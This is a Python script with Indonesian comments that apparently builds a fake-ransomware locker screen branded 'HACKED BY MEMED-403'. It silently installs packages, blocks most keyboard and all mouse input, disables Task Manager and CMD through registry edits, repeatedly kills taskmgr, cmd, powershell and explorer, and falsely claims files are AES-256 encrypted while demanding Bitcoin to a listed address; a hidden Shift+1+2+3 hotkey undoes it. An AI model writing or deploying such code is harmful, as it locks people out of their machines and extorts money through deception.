import sys
import os
import subprocess
import time
import datetime
import tkinter as tk
from PIL import Image, ImageTk, ImageDraw
import urllib.request
import io

def install_required_modules():
    """Auto install required modules jika belum terinstall - tanpa tampilan CMD"""
    required_modules = ['pillow', 'keyboard', 'urllib3']
    
    for module in required_modules:
        try:
            if module == 'pillow':
                __import__('PIL')
            elif module == 'keyboard':
                __import__('keyboard')
            elif module == 'urllib3':
                __import__('urllib3')
            print(f"✓ Module {module} sudah terinstall")
        except ImportError:
            print(f"✗ Module {module} tidak ditemukan, menginstall...")
            try:
                pip_module = 'Pillow' if module == 'pillow' else module
                
                # Install module tanpa tampilan CMD
                if os.name == 'nt':  # Windows
                    startupinfo = subprocess.STARTUPINFO()
                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                    startupinfo.wShowWindow = 0  # SW_HIDE - hide window
                    
                    subprocess.check_call([
                        sys.executable, '-m', 'pip', 'install', pip_module, '--quiet'
                    ], startupinfo=startupinfo, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                else:  # Linux/Mac
                    subprocess.check_call([
                        sys.executable, '-m', 'pip', 'install', pip_module, '--quiet'
                    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    
                print(f"✓ Berhasil menginstall {pip_module}")
            except Exception as e:
                print(f"✗ Gagal menginstall {module}: {e}")
                return False
    return True

def load_image_from_url(url):
    """Load gambar langsung dari URL tanpa download ke file"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'image/webp,image/apng,image/*,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.tiktok.com/',
            'Sec-Fetch-Dest': 'image',
            'Sec-Fetch-Mode': 'no-cors',
            'Sec-Fetch-Site': 'cross-site'
        }
        
        req = urllib.request.Request(url, headers=headers)
        
        print(f"Memuat gambar dari URL: {url[:50]}...")
        with urllib.request.urlopen(req, timeout=10) as response:
            image_data = response.read()
        
        # Load gambar langsung dari data bytes ke PIL Image
        image = Image.open(io.BytesIO(image_data))
        print("✓ Gambar berhasil dimuat dari URL")
        return image
        
    except Exception as e:
        print(f"✗ Gagal memuat gambar dari URL: {e}")
        return None

def try_multiple_image_sources():
    """Coba berbagai sumber gambar"""
    # List berbagai URL gambar yang mungkin berhasil
    image_urls = [
        # URL TikTok asli
        "https://p16-sign-sg.tiktokcdn.com/tos-alisg-avt-0068/c43c5731e0e74442572d30e7d3432fc7~tplv-tiktokx-cropcenter:1080:1080.jpeg?dr=14579&refresh_token=30d2b1a3&x-expires=1763186400&x-signature=6%2BTpCilbl1XlMrb3rMlsbO2lRnw%3D&t=4d5b0474&ps=13740610&shp=a5d48078&shcp=81f88b70&idc=my",
        
        # Fallback URLs - gambar hacker/glitch dari internet
        "https://i.imgur.com/3Q6Y7Y2.png",  # Glitch effect image
        "https://i.imgur.com/9E2z3w3.png",  # Hacker image
        "https://i.imgur.com/7X8g3b3.png",  # Anonymous mask
        
        # Gambar placeholder lainnya
        "https://via.placeholder.com/200/FF0000/FFFFFF?text=HACKED",
        "https://via.placeholder.com/200/000000/FF0000?text=MEMED-403",
    ]
    
    for url in image_urls:
        image = load_image_from_url(url)
        if image:
            return image
    
    return None

def create_default_image():
    """Buat gambar default jika semua URL gagal"""
    try:
        img = Image.new('RGB', (200, 200), color='black')
        d = ImageDraw.Draw(img)
        
        # Background dengan efek glitch
        for i in range(0, 200, 5):
            d.line([(i, 0), (i, 200)], fill='red', width=1)
            d.line([(0, i), (200, i)], fill='darkred', width=1)
        
        # Kotak merah
        d.rectangle([40, 40, 160, 160], fill='red', outline='white', width=2)
        
        # Text HACKED
        d.text((50, 70), "HACKED", fill='white')
        d.text((30, 100), "MEMED-403", fill='white')
        
        return img
    except:
        return None

def unblock_keyboard():
    """Buka blokir keyboard"""
    try:
        import keyboard
        keyboard.unhook_all()
        print("Keyboard diaktifkan kembali")
    except Exception as e:
        print(f"Tidak bisa membuka blokir keyboard: {e}")

def block_keyboard_input():
    """Blokir semua input kecuali tombol 1, 2, 3 dan Shift"""
    try:
        import keyboard

        # Blokir SEMUA tombol termasuk Windows, kecuali 1,2,3 dan Shift
        all_keys = [
            'esc', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',
            '4', '5', '6', '7', '8', '9', '0',
            'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
            'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
            'tab', 'caps lock', 'ctrl', 'alt', 'space', 'enter', 'backspace',
            'print screen', 'scroll lock', 'pause', 'insert', 'home', 'page up',
            'delete', 'end', 'page down', 'up', 'down', 'left', 'right',
            'num lock', 'num 0', 'num 1', 'num 2', 'num 3', 'num 4', 'num 5',
            'num 6', 'num 7', 'num 8', 'num 9', 'num enter', 'num +', 'num -', 'num *', 'num /', 'num .',
            'left windows', 'right windows', 'menu'
        ]

        # Tombol yang diizinkan: 1, 2, 3, dan semua shift
        allowed_keys = ['1', '2', '3', 'shift', 'left shift', 'right shift']
        
        for key in all_keys:
            if key not in allowed_keys:
                try:
                    keyboard.block_key(key)
                except:
                    pass

        print("Keyboard diblokir kecuali tombol 1, 2, 3, dan Shift")
        
    except Exception as e:
        print(f"Tidak bisa memblokir keyboard: {e}")

def disable_system_functions(stop_flag):
    """Nonaktifkan berbagai fungsi sistem"""
    try:
        if os.name == 'nt':
            os.system('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul 2>&1')
            os.system('reg add "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System" /v "DisableCMD" /t REG_DWORD /d 1 /f >nul 2>&1')
            
        while not stop_flag():
            try:
                if os.name == 'nt':
                    os.system('taskkill /f /im taskmgr.exe >nul 2>&1')
                    os.system('taskkill /f /im cmd.exe >nul 2>&1')
                    os.system('taskkill /f /im powershell.exe >nul 2>&1')
                    os.system('taskkill /f /im explorer.exe >nul 2>&1')  # Matikan explorer
                else:  # Linux/Mac
                    os.system('pkill -f "task manager" >/dev/null 2>&1')
                    os.system('pkill -f "terminal" >/dev/null 2>&1')
            except:
                pass
            time.sleep(1)
    except Exception as e:
        pass

class FullscreenHacked:
    def __init__(self):
        if not install_required_modules():
            print("Tidak dapat menginstall modules yang diperlukan!")
            
        # Blokir keyboard segera setelah modules terinstall
        block_keyboard_input()
        
        # Flag untuk stop disable_system_functions
        self.stop_blocker = False
        
        self.root = tk.Tk()
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.attributes('-disabled', True)
        
        # Sembunyikan cursor dengan cara yang lebih efektif
        self.root.config(cursor='none')
        self.root['cursor'] = 'none'
        
        # Hilangkan window decoration
        self.root.overrideredirect(True)
        
        # Force focus dan capture semua input
        self.root.focus_force()
        self.root.grab_set()
        self.root.grab_set_global()
        
        # Bind events untuk blokir input (backup)
        self.root.bind('<Key>', self.block_keyboard)
        self.root.bind('<Button>', self.block_mouse)
        self.root.bind('<Motion>', self.block_mouse)
        
        # Blokir shortcut keyboard di level tkinter, kecuali Shift
        for key in ['<Alt_L>', '<Alt_R>', '<F4>', '<Super_L>', '<Super_R>', 
                   '<Control_L>', '<Control_R>', '<Escape>', '<Tab>', '<Win_L>', '<Win_R>']:
            self.root.bind(key, self.block_keyboard)
        
        # Jangan blokir Shift
        self.root.bind('<Shift_L>', self.allow_shift)
        self.root.bind('<Shift_R>', self.allow_shift)
        
        # Blokir semua kombinasi tombol
        self.root.bind('<Alt-Tab>', self.block_keyboard)
        self.root.bind('<Control-Alt-Delete>', self.block_keyboard)
        self.root.bind('<Alt-F4>', self.block_keyboard)
        
        # Protocol untuk auto-restore system saat window ditutup
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        # Setup hotkey Shift+1+2+3 untuk close
        self.setup_hotkey()
        
        self.setup_ui()
        self.start_system_blocker()
        
    def setup_hotkey(self):
        """Setup hotkey Shift+1+2+3 untuk close program"""
        try:
            import keyboard
            keyboard.add_hotkey('shift+1+2+3', self.on_closing)
            print("Hotkey Shift+1+2+3 ready untuk close program")
        except Exception as e:
            print(f"Error setup hotkey: {e}")
        
    def load_image(self):
        """Load gambar dengan multiple fallback options"""
        print("Mencoba memuat gambar...")
        
        # 1. Coba dari berbagai URL
        image = try_multiple_image_sources()
        if image:
            return image
        
        # 2. Coba dari local files
        image_paths = [
            "glitchhat.jpg",
            "glitchhat.png",
            "glitchhat.jpeg",
            "logo.jpg",
            "logo.png",
            "hacked.jpg"
        ]
        
        for path in image_paths:
            if os.path.exists(path):
                try:
                    print(f"Mencoba membuka file lokal: {path}")
                    image = Image.open(path)
                    return image
                except Exception as e:
                    print(f"Gagal membuka gambar {path}: {e}")
                    continue
        
        # 3. Buat gambar default
        print("Membuat gambar default...")
        image = create_default_image()
        if image:
            return image
        
        return None
        
    def setup_ui(self):
        # Background hitam
        self.root.configure(bg='black')
        
        # Frame utama untuk center content
        main_frame = tk.Frame(self.root, bg='black')
        main_frame.pack(expand=True, fill='both')
        
        # Container untuk konten di tengah
        content_frame = tk.Frame(main_frame, bg='black')
        content_frame.place(relx=0.5, rely=0.5, anchor='center')
        
        # === TIME DISPLAY di pojok kiri atas ===
        self.time_label = tk.Label(main_frame, font=('Courier', 12), 
                                 fg='white', bg='black')
        self.time_label.place(x=20, y=20)
        
        # === LOGO ===
        print("Memuat logo...")
        image = self.load_image()
        if image:
            try:
                # Resize ke 200px width
                image.thumbnail((200, 200), Image.Resampling.LANCZOS)
                photo = ImageTk.PhotoImage(image)
                
                logo_label = tk.Label(content_frame, image=photo, bg='black')
                logo_label.image = photo  # Keep reference
                logo_label.pack(pady=(0, 20))
                print("✓ Logo berhasil dimuat dan ditampilkan")
            except Exception as e:
                print(f"Error memproses gambar: {e}")
                self.create_text_logo(content_frame)
        else:
            self.create_text_logo(content_frame)
        
        # === JUDUL UTAMA ===
        title_label = tk.Label(content_frame, text="HACKED BY MEMED-403",
                              font=('Courier', 40), 
                              fg='red', bg='black')
        title_label.pack(pady=(0, 10))
        
        # === SUBTITLE ===
        subtitle_label = tk.Label(content_frame, text="YOUR SYSTEM HAS BEEN ENCRYPTED", 
                                font=('Courier', 16), 
                                fg='#FF6B6B', bg='black')
        subtitle_label.pack(pady=(0, 10))
        
        # === PESAN ===
        message_label = tk.Label(content_frame, text="All your files are encrypted with military-grade encryption (AES-256)", 
                               font=('Courier', 14), 
                               fg='white', bg='black', justify='center', wraplength=600)
        message_label.pack(pady=(0, 20))
        
        # === TEKS TANPA BERKEDIP ===
        text1_label = tk.Label(content_frame, text="Your documents, photos, and databases are no longer accessible.",
                              font=('Courier', 12), 
                              fg='white', bg='black', justify='center', wraplength=600)
        text1_label.pack(pady=5)
        
        text2_label = tk.Label(content_frame, text="To restore your files, you must make a payment.\nFailure to do so will result in permanent loss of data.", 
                              font=('Courier', 12), 
                              fg='#FF8888', bg='black', justify='center', wraplength=600)
        text2_label.pack(pady=10)

        text3_label = tk.Label(content_frame, text="Send 0,0017647BTC to this address:bc1qt4pq29ndpk2qkp5qsqqysfjxzssyl6wpgrnzag",
                              font=('Courier', 8), 
                              fg='#FF8888', bg='black', justify='center', wraplength=600)
        text3_label.pack(pady=5)

        # === FOOTER ===
        footer_label = tk.Label(main_frame, 
                              text="© 2025 Glitch-HAT Cyber Team | For Cyber To Security", 
                              font=('Courier', 12), 
                              fg='gray', bg='black')
        footer_label.place(relx=0.5, rely=0.95, anchor='center')
        
        # Start time update
        self.update_time()
        
    def create_text_logo(self, parent_frame):
        """Buat logo text jika gambar tidak ada"""
        logo_text = tk.Label(parent_frame, text="[GLITCH-HAT]", 
                           font=('Courier', 16), 
                           fg='red', bg='black')
        logo_text.pack(pady=(0, 20))
        print("✗ Menggunakan logo text fallback")
    
    def update_time(self):
        """Update waktu real-time"""
        now = datetime.datetime.now()
        time_str = now.strftime("%H:%M:%S")
        date_str = now.strftime("%Y-%m-%d")
        
        self.time_label.config(text=f"{date_str} | {time_str}")
        self.root.after(1000, self.update_time)
    
    def allow_shift(self, event):
        """Izinkan tombol Shift"""
        return  # Biarkan event Shift diproses
    
    def block_keyboard(self, event):
        """Blokir semua input keyboard kecuali 1,2,3,Shift"""
        # Izinkan tombol 1,2,3,Shift
        if event.keysym in ['1', '2', '3', 'Shift_L', 'Shift_R']:
            return  # Biarkan event diproses
        return "break"  # Blokir tombol lain
    
    def block_mouse(self, event):
        """Blokir semua input mouse"""
        # Sembunyikan cursor lagi setiap kali mouse bergerak
        self.root.config(cursor='none')
        return "break"
    
    def start_system_blocker(self):
        """Mulai background process untuk memblokir sistem"""
        import threading
        blocker_thread = threading.Thread(target=disable_system_functions, args=(lambda: self.stop_blocker,), daemon=True)
        blocker_thread.start()
    
    def on_closing(self):
        """Auto-restore system dan enable keyboard saat window ditutup"""
        print("Window ditutup, restore system...")
        
        # Signal stop ke disable_system_functions
        self.stop_blocker = True
        time.sleep(1)  # Tunggu thread berhenti
        
        # Buka blokir keyboard
        unblock_keyboard()
        
        # Restore system functions
        if os.name == 'nt':
            print("Menghidupkan explorer.exe...")
            os.system('start explorer.exe >nul 2>&1')
            print("Menghapus registry restrictions...")
            os.system('reg delete "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableTaskMgr" /f >nul 2>&1')
            os.system('reg delete "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System" /v "DisableCMD" /f >nul 2>&1')
        
        print("System restored!")
        self.cleanup_and_exit()
    
    def cleanup_and_exit(self):
        """Bersihkan dan exit"""
        try:
            self.root.quit()
        except:
            pass
        finally:
            sys.exit()
    
    def run(self):
        """Jalankan aplikasi"""
        try:
            self.root.mainloop()
        except Exception as e:
            try:
                self.cleanup_and_exit()
            except:
                pass

if __name__ == "__main__":
    # Langsung jalankan tanpa countdown
    app = FullscreenHacked()
    app.run()